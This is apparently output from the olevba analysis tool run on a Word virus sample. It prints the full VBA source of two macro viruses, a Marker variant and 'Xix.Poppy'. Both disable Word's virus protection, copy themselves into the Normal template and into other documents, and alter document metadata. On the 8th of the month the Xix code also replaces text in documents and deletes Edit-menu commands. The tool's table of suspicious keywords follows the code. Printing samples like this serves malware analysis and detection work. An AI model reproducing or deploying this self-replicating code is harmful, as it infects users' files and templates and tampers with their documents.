olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ae-6ec4ddae05c42587c50af1171faceded2e00d5c8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ae-6ec4ddae05c42587c50af1171faceded2e00d5c8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim x1, x2, x3, x4 As Boolean
Dim x5, x6 As Object
Dim x7, x8, x16 As Integer
Dim x9 As Date
Dim x10, x11, x12, x13, x14 As String
Const x15 = ":-D you are marked!"

Private Sub CommandButton11_Click()
' Threat Macro
' Macro recorded 01/07/99 by Telephone Switching
'
    Application.PrintOut FileName:="", Range:=wdPrintRangeOfPages, Item:= _
        wdPrintDocumentContent, Copies:=1, Pages:="19-46", PageType:= _
        wdPrintAllPages, Collate:=False, Background:=True, PrintToFile:=False
End Sub

Private Sub CommandButton12_Click()
'
' Process Macro
' Macro recorded 01/07/99 by Telephone Switching
'
    Application.PrintOut FileName:="", Range:=wdPrintRangeOfPages, Item:= _
        wdPrintDocumentContent, Copies:=1, Pages:="47-87", PageType:= _
        wdPrintAllPages, Collate:=False, Background:=True, PrintToFile:=False
End Sub

Private Sub Main_Click()
'
' Main Macro
' Macro recorded 01/07/99 by Telephone Switching
'
    Application.PrintOut FileName:="", Range:=wdPrintRangeOfPages, Item:= _
        wdPrintDocumentContent, Copies:=1, Pages:="1-18", PageType:= _
        wdPrintAllPages, Collate:=False, Background:=True, PrintToFile:=False
End Sub


Private Sub Document_Close()
On Error Resume Next
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    Application.Caption = "Happy Birthday Shankar-25th July.The World may Forget but not me"
    x10 = MsgBox("Did You Wish Shankar on his Birthday ?", vbYesNo)
    If x10 = vbYes Then
        MsgBox "Thank You! I Love You. You are wonderfull."
    Else
        MsgBox " You are Heart Less." & vbCrLf & "You Will Be Punished For This", vbCritical
    End If
End If
If x3 = True Then
    x13 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
ElseIf x4 = True Then
    x13 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
End If

If (x3 = True Xor x4 = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then

      If x3 = True Then
        x2 = NormalTemplate.Saved
        x11 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
        x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
        x6.CodeModule.AddFromString x11
        With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "Shankar's Birthday falls on 25th July.  Don't Forget to wish him": .Execute: End With
        If x2 = True Then NormalTemplate.Save
      End If
    If x4 = True Or ActiveDocument.Saved = False Then
     x1 = ActiveDocument.Saved
     x11 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
     x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
     x5.CodeModule.AddFromString x11
     With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "Shankar's Birthday falls on 25th July.  Don't Forget to wish him": .Execute: End With
     If x1 = True Then ActiveDocument.Save
   End If
  
    
End If

End Sub

Private Sub Document_New()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
With Selection.Font: x16 = .Size: .Size = 72: .ColorIndex = wdGreen: .Animation = wdAnimationSparkleText: Selection.InsertAfter "Happy BirthDay Shankar": Selection.MoveDown Unit:=wdScreen, Count:=2: .Size = x16: .ColorIndex = wdAuto: .Animation = wdAnimationNone: End With
End If
End Sub

Private Sub Document_Open()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    x10 = MsgBox("Did You Wish Shankar on his Birthday ?", vbYesNo)
End If
End Sub































































-------------------------------------------------------------------------------
VBA MACRO xix.bas 
in file: Virus.MSWord.Marker.ae-6ec4ddae05c42587c50af1171faceded2e00d5c8 - OLE stream: 'Macros/VBA/xix'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub xix()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 5083-QyUo94005083.c
    '=================================
    'This Virus Is: Xix.Poppy
    
On Error Resume Next
Randomize
BzUz7979 = OnLnBvVq & GjCy17022 & JvCeAiQx & VxLk11768
KrNo8852 = ReRnBxQg & UvHm12817 & LsKgBxIj & TiFo12200
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("xix").Export "c:\xix.drv"
ActiveDocument.ReadOnlyRecommended = False
NsRt = Int(Rnd * 100)
    If NsRt = 99 Then MsgBox "Dia 8 de Novembro VOTA NĂO ŕ regionalizaçăo!", vbSystemModal
MgToTvGm = VwDx2292 & LlPg10701
If Day(Now()) = 8 Then Call UmCu9400BsTy
DgCx6829 = DrGhQhNe & ExCf6570 & Int(Rnd * 2675)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "VOTA NĂO Ŕ REGIONALIZAÇĂO! SIM AO REFORÇO DO MUNICIPALISMO!"
    .Subject = "JOĂO JARDIM x8?! PORRA! DIA 8 VOTA NĂO!"
    .Comments = "A REGIONALIZAÇĂO É UM ERRO COLOSSAL!"
    .Execute
End With
If NormalTemplate.VBProject.VBComponents.Item("xix").Name <> "xix" Then MvBv508370643 = True
PlEqIfRo = QwLq7775 & OpHg16129
If ActiveDocument.VBProject.VBComponents.Item("xix").Name <> "xix" Then TxHi70648 = True
If MvBv508370643 = True And TxHi70648 = False Then Set JxPg706450836 = NormalTemplate.VBProject.VBComponents
If MvBv508370643 = False And TxHi70648 = True Then Set JxPg706450836 = ActiveDocument.VBProject.VBComponents
JxPg706450836.import "c:\xix.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If TxHi70648 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
GoNqGpTs:
End Sub
Sub HelpAbout()
    On Error Resume Next
IqAj10564 = SgGwHmVe & KlLp7022 & PeVyEhIs & NkCo10807
    MsgBox "Joăo Jardim x8?! Porra! Dia 8 Vota NĂO!", vbInformation
End Sub
Sub AutoOpen()
    On Error Resume Next
PuIq14134 = TkEmRxTv & FyIe14577 & Int(Rnd * 8391)
    Call xix
SxLn19336 = OyOrAfGz & QtGv12202 & Int(Rnd * 9871)
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call xix
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call xix
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call xix
ChNz19101 = EwCyLsKj & LuTw19501 & Int(Rnd * 9898)
NhAlIqVz = NhNm11382 & TqVm7492
End Sub
Sub UmCu9400BsTy()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "sim"
            .Replacement.Text = "năo ŕ regionalizaçăo!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton11_Clic|Runs when the file is opened and ActiveX     |
|          |k                   |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

